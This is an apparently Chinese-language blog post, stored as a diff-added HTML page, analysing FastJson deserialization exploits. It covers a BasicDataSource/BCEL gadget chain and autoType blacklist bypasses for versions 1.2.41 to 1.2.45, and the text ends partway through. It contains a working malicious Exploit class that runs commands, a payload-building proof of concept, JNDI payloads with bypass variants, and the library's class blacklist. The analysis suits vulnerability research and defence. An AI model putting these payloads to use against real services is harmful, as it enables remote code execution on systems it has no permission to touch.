@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="FastJson反序列化后续BasicDataSource调用链在查资料时,碰到了org.apache.tomcat.dbcp.dbcp.BasicDataSource这个Gadget,遂复现分析一波             前置知识 利用Class.forName()执行代码有两种方式          12class.forname(classname)		class.forname(clas">
+<meta name="keywords" content="Java安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson反序列化后续">
+<meta property="og:url" content="http://yoursite.com/2019/06/02/Fatsjson反序列化后续/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="FastJson反序列化后续BasicDataSource调用链在查资料时,碰到了org.apache.tomcat.dbcp.dbcp.BasicDataSource这个Gadget,遂复现分析一波             前置知识 利用Class.forName()执行代码有两种方式          12class.forname(classname)		class.forname(clas">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.11.19.41-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-01.22.16.09-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-01.22.18.32-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-01.22.20.52-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.10.42.15-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.10.51.11-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.10.43.48-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.11.32.04-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.11.34.47-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.11.38.56-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.15.20.38-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.18.13.37-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.21.26.33-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.21.09.34-image.png">
+<meta property="og:updated_time" content="2019-06-10T06:10:05.462Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="FastJson反序列化后续">
+<meta name="twitter:description" content="FastJson反序列化后续BasicDataSource调用链在查资料时,碰到了org.apache.tomcat.dbcp.dbcp.BasicDataSource这个Gadget,遂复现分析一波             前置知识 利用Class.forName()执行代码有两种方式          12class.forname(classname)		class.forname(clas">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.11.19.41-image.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="../../../../images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>FastJson反序列化后续</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="../../../../css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="../../08/Ysoserial之JDK7u21分析/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="../../../05/28/SpEL表达式注入/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&text=FastJson反序列化后续"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&is_video=false&description=FastJson反序列化后续"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FastJson反序列化后续&body=Check out this article: http://yoursite.com/2019/06/02/Fatsjson反序列化后续/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&name=FastJson反序列化后续&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson反序列化后续"><span class="toc-number">1.</span> <span class="toc-text">FastJson反序列化后续</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BasicDataSource调用链"><span class="toc-number">2.</span> <span class="toc-text">BasicDataSource调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前置知识"><span class="toc-number">2.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞条件"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson反序列化1-2-41-1-2-45绕过"><span class="toc-number">3.</span> <span class="toc-text">FastJson反序列化1.2.41-1.2.45绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-41-1-2-45绕过"><span class="toc-number">3.1.</span> <span class="toc-text">1.2.41-1.2.45绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-41"><span class="toc-number">3.1.1.</span> <span class="toc-text">V1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-42"><span class="toc-number">3.1.2.</span> <span class="toc-text">V1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-43"><span class="toc-number">3.1.3.</span> <span class="toc-text">V1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-45"><span class="toc-number">3.1.4.</span> <span class="toc-text">V1.2.45</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-FastJson"><span class="toc-number">4.</span> <span class="toc-text">Bypass FastJson</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        FastJson反序列化后续
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">P0rZ9's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-06-02T00:15:41.000Z" itemprop="datePublished">2019-06-02</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="../../../../tags/Java安全/">Java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="FastJson反序列化后续"><a href="#FastJson反序列化后续" class="headerlink" title="FastJson反序列化后续"></a>FastJson反序列化后续</h1><h1 id="BasicDataSource调用链"><a href="#BasicDataSource调用链" class="headerlink" title="BasicDataSource调用链"></a>BasicDataSource调用链</h1><p>在查资料时,碰到了<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>这个Gadget,遂复现分析一波            </p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
+<p>利用Class.forName()执行代码有两种方式        </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.forname(classname)		</span><br><span class="line">class.forname(classname, true, ClassLoaderName)</span><br></pre></td></tr></table></figure>
+<p><strong>class.forname(classname)</strong></p>
+<blockquote>
+<p>通过控制参数classname执行代码</p>
+</blockquote>
+<p><strong>class.forname(classname, true, ClassLoaderName)</strong></p>
+<blockquote>
+<p>通过控制className与classLoaderName执行代码。</p>
+</blockquote>
+<p>第一种方式是加载传入的类名,若类存在静态代码块,则会执行其中的代码；第二种方式指定类名与类加载器。其中第二个参数为true表示会加载静态代码块。</p>
+<p>看个例子:            </p>
+<blockquote>
+<p>这里我们使用com.sun.org.apache.bcel.internal.util.ClassLoader这个动态加载器。这个classloader允许传入经过BCEL编码的字节码内容(className),所以我们对恶意类的字节码进行BCEL编码,赋给className,classloader指定为这个加载器，调用class.forname(className, true, classloader)就会加载恶意类的静态代码块中的代码        </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">恶意类			</span><br><span class="line">Exploit.java			</span><br><span class="line">public class Exploit &#123;</span><br><span class="line">    private static final String ex = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String ex = exec(&quot;ipconfig&quot;);</span><br><span class="line">            throw new Exception(ex);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String exec(String cmd) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String s = &quot;&quot;;</span><br><span class="line">            int len;</span><br><span class="line">            int bufSize = 4096;</span><br><span class="line">            byte[] buffer = new byte[bufSize];</span><br><span class="line">            BufferedInputStream bis = new BufferedInputStream(Runtime.getRuntime()</span><br><span class="line">                    .exec(cmd)</span><br><span class="line">                    .getInputStream(),</span><br><span class="line">                    bufSize);</span><br><span class="line"></span><br><span class="line">            while ((len = bis.read(buffer, 0, bufSize)) != -1)</span><br><span class="line">                s += new String(buffer, 0, len);</span><br><span class="line">            bis.close();</span><br><span class="line">            return s;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ClassForNamePoC.java		</span><br><span class="line">public class ClassForNamePoC &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //1.指定类名  Class.forname(ClassName)</span><br><span class="line">        //Class.forName(&quot;Exploit&quot;);</span><br><span class="line"></span><br><span class="line">        //2.指定动态加载器与类   class.forname(classname, true, ClassLoaderName)</span><br><span class="line">        String classFile = &quot;C:\\sec\\java-sec\\defineClassDemo\\target\\classes\\Exploit.class&quot;;</span><br><span class="line">        String className = &quot;org.apache.log4j.spi$$BCEL$$&quot;+class2BCEL(classFile);</span><br><span class="line">        ClassLoader cls=new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        Class.forName(className,true,cls);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String class2BCEL(String classFile) throws Exception&#123;</span><br><span class="line">        Path path = Paths.get(classFile);</span><br><span class="line">        byte[] bytes = Files.readAllBytes(path);</span><br><span class="line">        String result = Utility.encode(bytes,true);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.11.19.41-image.png" alt="2019-06-03.11.19.41-image.png"></p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><blockquote>
+<p>Fastjson()使用parseObject()进行反序列化时，调用目标类的全部getter(),而Gadget的getConnection()方法存在Class.forName(driverClassName, true, driverClassLoader),且driverClassName与driverClassLoader可控,所以通过调用特定的Classloader去加载构造的恶意类,造成任意代码执行            </p>
+</blockquote>
+<h2 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反序列化的格式是JSON.parseObject(jsonStr)即可。不用开启</span><br><span class="line">Feature.SupportNonPublicField</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Exploit.java</span><br><span class="line">public class Exploit &#123;</span><br><span class="line">    static &#123;</span><br><span class="line"></span><br><span class="line">        String ex = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            ex = exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new RuntimeException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static String exec(String cmd) throws Exception&#123;</span><br><span class="line">        String s = null;</span><br><span class="line">        int len;</span><br><span class="line">        byte[] bytes = new byte[4096];</span><br><span class="line">        BufferedInputStream bis = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream(),4096);</span><br><span class="line">        while ((len = bis.read(bytes,0,4096)) != -1)&#123;</span><br><span class="line">            s += new String(bytes,0,len);</span><br><span class="line">        &#125;</span><br><span class="line">        bis.close();</span><br><span class="line">        throw new Exception(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BasicDataSourcePoC.java			</span><br><span class="line">public class BasicDataSourcePoC &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //version:1.2.23</span><br><span class="line">        String classFile = &quot;C:\\sec\\Exploit.class&quot;;</span><br><span class="line">        String className = &quot;org.apache.log4j.$$BCEL$$&quot;+class2BCEL(classFile);</span><br><span class="line">        String payload = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;  \&quot;@type\&quot; : \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="line">                &quot;  \&quot;driverClassName\&quot; : \&quot;&quot;+className+&quot;\&quot;,\n&quot; +</span><br><span class="line">                &quot;  \&quot;driverClassLoader\&quot; :\n&quot; +</span><br><span class="line">                &quot;  &#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;@type\&quot;:\&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;\&quot;\n&quot; +</span><br><span class="line">                &quot;  &#125;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //将字节码文件进行BCEL编码</span><br><span class="line">    public static String class2BCEL(String classFile) throws Exception&#123;</span><br><span class="line">        Path path = Paths.get(classFile);</span><br><span class="line">        byte[] bytes = Files.readAllBytes(path);</span><br><span class="line">        String result = Utility.encode(bytes,true);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>使用<code>parseObject(payload)</code>时会调用类的全部<code>getter</code>方法,其中在<code>getConnection()</code>中调用<code>createDataSource()</code>,跟进到<code>createConnectionFactory()</code></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-01.22.16.09-image.png" alt="2019-06-01.22.16.09-image.png"></p>
+<p>接着就会调用<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>的<code>loadClass()</code>:            </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">protected Class loadClass(String class_name, boolean resolve)</span><br><span class="line">    throws ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">   ...</span><br><span class="line">      if(cl == null) &#123;</span><br><span class="line">        JavaClass clazz = null;</span><br><span class="line"></span><br><span class="line">        if(class_name.indexOf(&quot;$$BCEL$$&quot;) &gt;= 0)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        else &#123; // Fourth try: Load classes via repository</span><br><span class="line">          if ((clazz = repository.loadClass(class_name)) != null) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">            throw new ClassNotFoundException(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(clazz != null) &#123;</span><br><span class="line">          byte[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, 0, bytes.length);</span><br></pre></td></tr></table></figure>
+<p><code>class_name</code>如果存在<code>$$BCEL$$</code>,调用<code>createClass()</code>,跟进<br>截取<code>real_name</code>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-01.22.18.32-image.png" alt="2019-06-01.22.18.32-image.png"></p>
+<p>经过<code>decode()</code>解码后,会得到恶意类的字节码<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-01.22.20.52-image.png" alt="2019-06-01.22.20.52-image.png"></p>
+<p>最后返回到<code>loadClass()</code>中,调用<code>defineClass()</code>从字节码中还原类并加载,执行静态代码块中的命令            </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.10.42.15-image.png" alt="2019-06-03.10.42.15-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-03.10.51.11-image.png" alt="2019-06-03.10.51.11-image.png"></p>
+<p>1.<strong>parseObject()为啥会调用getConnection()</strong></p>
+<blockquote>
+<p>当使用parseObject(jsonStr)时,会调用@type指定的所有getter(),包括不存在属性的getter()。</p>
+</blockquote>
+<p>涉及到Fastjson的反序列化机制参考笔者之前文章:<br><a href="https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">Fastjson反序列化之TemplatesImpl调用链</a></p>
+<h1 id="FastJson反序列化1-2-41-1-2-45绕过"><a href="#FastJson反序列化1-2-41-1-2-45绕过" class="headerlink" title="FastJson反序列化1.2.41-1.2.45绕过"></a>FastJson反序列化1.2.41-1.2.45绕过</h1><blockquote>
+<p>先知廖大神的议题：<a href="https://xz.aliyun.com/t/2400" target="_blank" rel="noopener">https://xz.aliyun.com/t/2400</a>        </p>
+</blockquote>
+<p>之前分析的<a href="https://p0rz9.github.io/2019/05/14/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJdbcRowSetImpl/" target="_blank" rel="noopener">Fastjson反序列化之JdbcRowSetImpl利用链</a></p>
+<p>下面基于poc:<code>{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1093/evil\&quot;,\&quot;autoCommit\&quot;:true}</code>开始分析            </p>
+<h2 id="1-2-41-1-2-45绕过"><a href="#1-2-41-1-2-45绕过" class="headerlink" title="1.2.41-1.2.45绕过"></a>1.2.41-1.2.45绕过</h2><blockquote>
+<p>在1.2.41之后的版本<code>autoTypeSupport</code>默认为关闭状态,所以我们先开启设置:<code>vm options:-Dfastjson.parser.autoTypeSupport=true</code>            </p>
+</blockquote>
+<h3 id="V1-2-41"><a href="#V1-2-41" class="headerlink" title="V1.2.41"></a>V1.2.41</h3><p>运行原来poc,报错信息:<code>autoType is not support. com.sun.rowset.JdbcRowSetImpl</code>,在jar包中搜索<code>autoType is not support</code>,定位到<code>com.alibaba.fastjson.parser.ParserConfig</code>,该类会检查传入的class,若为以下关键字开头,会报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.apache.xalan</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure></p>
+<p>之后Fastjson在<code>loadClass()</code>里面会进行一些操作:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.10.43.48-image.png" alt="2019-05-31.10.43.48-image.png"></p>
+<p>我们尝试分别使用<code>[</code>与<code>L ;</code>绕过:        </p>
+<p><strong>L ;绕过</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1093/evil\&quot;,\&quot;autoCommit\&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
+<p>绕过黑名单,到达<code>loadClass()</code>处<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.11.32.04-image.png" alt="2019-05-31.11.32.04-image.png"></p>
+<p>去除<code>L ;</code>,最后会返回<code>class com.sun.rowset.JdbcRowSetImpl</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.11.34.47-image.png" alt="2019-05-31.11.34.47-image.png"></p>
+<p>之后就是去调用JdbcRowSetImpl的set方法触发JDNI注入了        </p>
+<p><strong>[绕过</strong><br>绕过黑名单,到达<code>loadClass()</code>处,<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.11.38.56-image.png" alt="2019-05-31.11.38.56-image.png"></p>
+<p>这样直接加<code>[</code>是不可以的，因为数组实例化的是Object类型,所以还要将传入的变量设置为数组格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1093/evil\&quot;,\&quot;autoCommit\&quot;:true]&#125;</span><br></pre></td></tr></table></figure>
